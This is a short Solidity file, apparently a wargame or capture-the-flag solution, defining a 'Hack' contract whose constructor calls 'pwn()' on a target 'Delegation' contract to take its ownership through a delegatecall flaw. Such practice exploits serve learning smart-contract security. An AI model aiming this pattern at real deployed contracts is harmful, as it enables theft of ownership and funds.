//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IDelegation {
    function pwn() external;

    function owner() external;
}

error Hack__CallFailed();

contract Hack {
    constructor(address contractAddress) {
        (bool success, ) = contractAddress.call(abi.encodeWithSignature("pwn()"));
        if (!success) {
            revert Hack__CallFailed();
        }
    }
}